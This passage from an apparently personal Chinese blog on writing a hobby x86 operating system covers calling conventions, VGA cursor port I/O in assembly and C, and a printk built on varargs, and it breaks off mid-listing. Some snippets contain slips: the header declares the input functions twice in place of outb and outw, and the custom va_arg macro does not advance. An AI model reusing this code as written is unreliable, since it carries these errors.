infomation，然后vscode调试的时候多下几个断点才能起到效果.很烦人</p><p>所以这里我直接猛下断点</p><p><img src="https://img.joe1sn.top/uploads/big/9302f6e8f60d75385f0a15eacb65c3d2.png" alt="image-20220303101005999" /></p><p>经过编译与链接，最终的elf文件如下</p><p><img src="https://img.joe1sn.top/uploads/big/724bcc74a57b6a06d81ecad5f976455c.png" alt="image-20220303101911061" /></p><p>在调试控制台使用如下命令查看栈信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-exec display/8xw $sp</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bf6e01fbcebd7972bc66de1b7ec8713b.png" alt="image-20220303101523045" /></p><p>（图片被处理过）可以看到栈的生长方向，还有相关的一些值</p><ul><li><strong>push</strong>：入栈</li><li><strong>pop</strong>：出栈</li><li><strong>pusha</strong>：压入8个寄存器</li><li><strong>popa</strong>：弹出7个寄存器，忽略<strong>esp</strong></li></ul><p><img src="https://img.joe1sn.top/uploads/big/a244b1216e7ed6e1301379bf8ae7ad60.png" alt="image-20220303102410339" /></p><p><strong>函数</strong></p><ul><li><strong>call</strong>：函数返回的下一条指令的返回地址压入栈</li><li><strong>ret</strong>：栈顶弹出到<strong>EIP</strong></li><li><strong>call</strong>与<strong>ret</strong>无关</li></ul><h2 id="变量与传参"><a class="markdownIt-Anchor" href="#变量与传参"></a> 变量与传参</h2><p>新建<code>src/test/param.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> z = x + y;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> c = add(a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: param.s</span></span><br><span class="line"><span class="section">param.s: param.c</span></span><br><span class="line">gcc <span class="variable">$(CFLAGS)</span> -S <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>最后生成的<code>src/test/param.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;param.c&quot;</span><br><span class="line">.text</span><br><span class="line">.globladd</span><br><span class="line">.typeadd, @function</span><br><span class="line">add:</span><br><span class="line">pushl%ebp</span><br><span class="line">movl%esp, %ebp</span><br><span class="line"></span><br><span class="line">subl$4, %esp;一个局部变量</span><br><span class="line">movl8(%ebp), %edx;a</span><br><span class="line">movl12(%ebp), %eax;b</span><br><span class="line">addl%edx, %eax;相加，eax+=edx</span><br><span class="line">movl%eax, -4(%ebp);z = x + y</span><br><span class="line">movl-4(%ebp), %eax;eax = z</span><br><span class="line"></span><br><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">.sizeadd, .-add</span><br><span class="line">.globlmain</span><br><span class="line">.typemain, @function</span><br><span class="line">main:</span><br><span class="line">pushl%ebp</span><br><span class="line">movl%esp, %ebp;保存栈帧</span><br><span class="line"></span><br><span class="line">subl$12, %esp;保存12字节，及3个局部变量</span><br><span class="line">movl$5, -12(%ebp);a</span><br><span class="line">movl$3, -8(%ebp);b</span><br><span class="line">;-----------------------------32位传参准备</span><br><span class="line">pushl-8(%ebp);b</span><br><span class="line">pushl-12(%ebp);a</span><br><span class="line">calladd</span><br><span class="line">addl$8, %esp;esp恢复</span><br><span class="line">movl%eax, -4(%ebp);c=add(a,b)</span><br><span class="line">movl$0, %eax;返回值存储在eax中(return 0)</span><br><span class="line"></span><br><span class="line">leave;回复栈帧</span><br><span class="line">ret</span><br><span class="line">.sizemain, .-main</span><br><span class="line">.section.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><ul><li>64位：寄存器传参</li><li>32位：栈传参</li></ul><p>取消栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;param.c&quot;</span><br><span class="line">.text</span><br><span class="line">.globladd</span><br><span class="line">.typeadd, @function</span><br><span class="line">add:</span><br><span class="line">subl$4, %esp</span><br><span class="line">movl8(%esp), %edx</span><br><span class="line">movl12(%esp), %eax</span><br><span class="line">addl%edx, %eax</span><br><span class="line">movl%eax, (%esp)</span><br><span class="line">movl(%esp), %eax</span><br><span class="line">addl$4, %esp</span><br><span class="line">ret</span><br><span class="line">.sizeadd, .-add</span><br><span class="line">.globlmain</span><br><span class="line">.typemain, @function</span><br><span class="line">main:</span><br><span class="line">subl$12, %esp</span><br><span class="line">movl$5, (%esp)</span><br><span class="line">movl$3, 4(%esp)</span><br><span class="line">pushl4(%esp)</span><br><span class="line">pushl4(%esp)</span><br><span class="line">calladd</span><br><span class="line">addl$8, %esp</span><br><span class="line">movl%eax, 8(%esp)</span><br><span class="line">movl$0, %eax</span><br><span class="line">addl$12, %esp</span><br><span class="line">ret</span><br><span class="line">.sizemain, .-main</span><br><span class="line">.section.note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p><strong>堆：<a href="https://blog.joe1sn.top/2021/01/16/heap_learning_part0-%E5%A0%86%E5%9F%BA%E7%A1%80/">https://blog.joe1sn.top/2021/01/16/heap_learning_part0-堆基础/</a></strong></p><h1 id="操作系统实现-io与字符串处理"><a class="markdownIt-Anchor" href="#操作系统实现-io与字符串处理"></a> 操作系统实现-IO与字符串处理</h1><blockquote><p>代码来源：<a href="https://github.com/StevenBaby/onix">https://github.com/StevenBaby/onix</a></p><p>相关课程：<a href="https://www.bilibili.com/video/BV1gR4y1u7or">https://www.bilibili.com/video/BV1gR4y1u7or</a></p><p>感谢B站UP：<a href="https://space.bilibili.com/491131440">踌躇月光</a> 带来的相关代码和教程</p></blockquote><h2 id="inputoutput"><a class="markdownIt-Anchor" href="#inputoutput"></a> Input/Output</h2><p>参考之前的硬盘读写，那么我们需要对一些端口进行操作</p><p>CRT：阴极射线管</p><ul><li>地址寄存器：0x3D4</li><li>数据寄存器：0x3D5</li><li>光标位置：高位0xE</li><li>光标位置：高位0xF</li></ul><p><code>src/include/xsys/io.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_IO_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_IO_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> u8 <span class="title function_">inb</span><span class="params">(u16 port)</span>;    <span class="comment">//输入一个字节</span></span><br><span class="line"><span class="keyword">extern</span> u16 <span class="title function_">inw</span><span class="params">(u16 port)</span>;   <span class="comment">//输入一个字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">inb</span><span class="params">(u16 port, u8 value)</span>;    <span class="comment">//输出一个字节</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">inw</span><span class="params">(u16 port, u16 value)</span>;   <span class="comment">//输出一个字</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/io.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">section .text; 代码段</span><br><span class="line"></span><br><span class="line">global inb ; 将 inb 导出</span><br><span class="line">inb:</span><br><span class="line">    push ebp; </span><br><span class="line">    mov ebp, esp ; 保存帧</span><br><span class="line"></span><br><span class="line">    xor eax, eax ; 将 eax 清空</span><br><span class="line">    mov edx, [ebp + 8]; port </span><br><span class="line">    in al, dx; 将端口号 dx 的 8 bit 输入到 al</span><br><span class="line"></span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br><span class="line">global outb</span><br><span class="line">outb:</span><br><span class="line">    push ebp; </span><br><span class="line">    mov ebp, esp ; 保存帧</span><br><span class="line"></span><br><span class="line">    mov edx, [ebp + 8]; port </span><br><span class="line">    mov eax, [ebp + 12]; value</span><br><span class="line">    out dx, al; 将 al 中的 8 bit 输入出到 端口号 dx</span><br><span class="line"></span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">global inw</span><br><span class="line">inw:</span><br><span class="line">    push ebp; </span><br><span class="line">    mov ebp, esp ; 保存帧</span><br><span class="line"></span><br><span class="line">    xor eax, eax ; 将 eax 清空</span><br><span class="line">    mov edx, [ebp + 8]; port </span><br><span class="line">    in ax, dx; 将端口号 dx 的 16 bit 输入到 ax</span><br><span class="line"></span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">global outw</span><br><span class="line">outw:</span><br><span class="line">    push ebp        ; </span><br><span class="line">    mov ebp, esp    ; 保存帧</span><br><span class="line"></span><br><span class="line">    mov edx, [ebp + 8]; port </span><br><span class="line">    mov eax, [ebp + 12]; value</span><br><span class="line">    out dx, ax; 将 ax 中的 16 bit 输入出到 端口号 dx</span><br><span class="line"></span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line">    jmp $+2 ; 一点点延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_ADDR_REG 0x3d4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_DATA_REG 0x3d5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_CURSOR_H 0xeu</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_CURSOR_L 0xf</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获得当前光标坐标</span></span><br><span class="line">    outb(CRT_ADDR_REG,CRT_CURSOR_H);    <span class="comment">//将高位导出到地址端口</span></span><br><span class="line">    u16 pos = inb(CRT_DATA_REG) &lt;&lt; <span class="number">8</span>;   <span class="comment">//移到pos高位</span></span><br><span class="line">    outb(CRT_ADDR_REG,CRT_CURSOR_L);    <span class="comment">//将低位导出到地址端口</span></span><br><span class="line">    pos |= inb(CRT_DATA_REG);           <span class="comment">//移到pos低位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改当前光标坐标</span></span><br><span class="line">    outb(CRT_ADDR_REG,CRT_CURSOR_H);</span><br><span class="line">    outb(CRT_DATA_REG,<span class="number">0</span>);</span><br><span class="line">    outb(CRT_ADDR_REG,CRT_CURSOR_L);</span><br><span class="line">    outb(CRT_DATA_REG,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/makefile</code></p><p>添加<code>io.o</code>依赖</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(BUILD)</span>/kernel.bin: \</span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel/start.o \</span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel/main.o \</span><br><span class="line"><span class="variable">$(BUILD)</span>/kernel/io.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">shell</span> mkdir -p $(<span class="built_in">dir</span> <span class="variable">$@</span>)</span>) </span><br><span class="line">ld -g -m elf_i386 -static <span class="variable">$^</span> -o <span class="variable">$@</span> -Ttext <span class="variable">$(ENTRYPOINT)</span></span><br></pre></td></tr></table></figure><p><strong>关于调试</strong></p><p>我在网上找了一圈，实在是没有找到像视频中的效果，所以建议使用gdb调试汇编相关</p><p>首先调试获得光标，这里基本要观察的变量在C语言中，可以试着使用vscode远程调试</p><p><img src="https://img.joe1sn.top/uploads/big/1562498802a6ad35a27519c8337e7567.png" alt="image-20220304093927250" /></p><p>​<img src="https://img.joe1sn.top/uploads/big/3a040de82e3a6bd7990e42ad151eaa3e.png" alt="image-20220304094325088" /></p><p>最后的得到值是：240，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mn>240</mn><mo stretchy="false">)</mo><mo>=</mo><mn>11110000</mn></mrow><annotation encoding="application/x-tex">bin(240)=11110000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord">2</span><span class="mord">4</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span>，所以高位是1111，地位是0000</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>240</mn><mo>=</mo><mn>3</mn><mo>∗</mo><mn>80</mn></mrow><annotation encoding="application/x-tex">240=3*80</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">4</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">0</span></span></span></span>，刚好也是第四行第一个</p><p><strong>接着修改光标位置</strong></p><p><img src="https://img.joe1sn.top/uploads/big/410dc689a27860c5c35b7d5309d52ac3.png" alt="image-20220304095250419" /></p><p>其实我们可以算出坐标的值：000000001，我们可以验证下</p><p><img src="https://img.joe1sn.top/uploads/big/eb53891a8e2b0c492b99ad0ecae9d717.png" alt="image-20220304095504910" /></p><h2 id="字符串处理"><a class="markdownIt-Anchor" href="#字符串处理"></a> 字符串处理</h2><p>有 <strong>#include &lt;string.h&gt;</strong></p><p>同时可以使用汇编或等更高效的实现</p><h2 id="参考-3"><a class="markdownIt-Anchor" href="#参考-3"></a> 参考</h2><p><a href="https://www.bilibili.com/video/BV1zL4y1s76t/?spm_id_from=333.788">https://www.bilibili.com/video/BV1zL4y1s76t/?spm_id_from=333.788</a></p><p><a href="https://www.osdever.net/FreeVGA/home.htm">https://www.osdever.net/FreeVGA/home.htm</a></p><p><a href="http://www.osdever.net/FreeVGA/vga/crtcreg.htm">http://www.osdever.net/FreeVGA/vga/crtcreg.htm</a></p><h1 id="操作系统实现-多参数与printk实现"><a class="markdownIt-Anchor" href="#操作系统实现-多参数与printk实现"></a> 操作系统实现-多参数与printk实现</h1><h2 id="printf的多参数原理"><a class="markdownIt-Anchor" href="#printf的多参数原理"></a> printf的多参数原理</h2><p><code>printk</code>这个函数实在操作系统内核里面实现的，一般在用户态中是<code>printf</code>，两者原理上差不多</p><p>首先看<code>printf</code>的多参数实现</p><p>在Linux源代码中，<code>printf</code>是这样写的</p><p><a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/boot">boot</a>/<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/boot/printf.c">printf.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> printf_buf[<span class="number">1024</span>];</span><br><span class="line">va_list args;</span><br><span class="line"><span class="type">int</span> printed;</span><br><span class="line"></span><br><span class="line">va_start(args, fmt);</span><br><span class="line">printed = <span class="built_in">vsprintf</span>(printf_buf, fmt, args);</span><br><span class="line">va_end(args);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(printf_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> printed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的变量类型 <code>va_list</code>、<code>va_start</code>、<code>va_end</code>定义如下</p><p><a href="https://elixir.bootlin.com/linux/latest/source">/</a><a href="https://elixir.bootlin.com/linux/latest/source/include">include</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux">linux</a>/<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/stdarg.h">stdarg.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LINUX_STDARG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LINUX_STDARG_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __builtin_va_list va_list;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(v, l)__builtin_va_start(v, l)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_end(v)__builtin_va_end(v)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(v, T)__builtin_va_arg(v, T)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_copy(d, s)__builtin_va_copy(d, s)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>gcc/x86_64-linux-gnu/7/include/stdarg.h中，有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __GNUC_VA_LIST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __GNUC_VA_LIST</span></span><br><span class="line"><span class="keyword">typedef</span> __builtin_va_list __gnuc_va_list;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>通过查阅gcc的源代码你会发现最原始的功能实现被改进了很多，其实可以翻译为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_STDARG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_STDARG_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span>* va_list;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(ap, v) (ap = (va_list)&amp;v + sizeof(char*) )</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(ap, t) (* (t*)(ap+=sizeof(char*)-sizeof(char*)) )</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_end(ap) (ap = (va_list)0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li><p>va_start(ap, v)：ap为 v（一个va_list）的开始格式化字符串</p></li><li><p>va_arg(ap, t)：t为当前格式化字符串，ap为下一个格式化字符串</p><p>注：<code>ap+=sizeof(char*)-sizeof(char*)</code>这时已经ap=ap+sizeof(char *)了</p></li><li><p>va_end(ap)：让格式化字符串置零</p></li></ul><p>则我们可以有printk实现</p><h2 id="printk实现"><a class="markdownIt-Anchor" href="#printk实现"></a> printk实现</h2><p><code>src/kernel/printk.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printk</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    va_start(args, fmt);</span><br><span class="line">    i = <span class="built_in">vsprintf</span>(buf, fmt, args);</span><br><span class="line">    va_end(args);</span><br><span class="line"></span><br><span class="line">    console_write(buf, i);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>src/lib/vsprintf.c</code></p><p>这里可以取巧抄linux的源代码：<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/boot/printf.c#L113">https://elixir.bootlin.com/linux/latest/source/arch/x86/boot/printf.c#L113</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 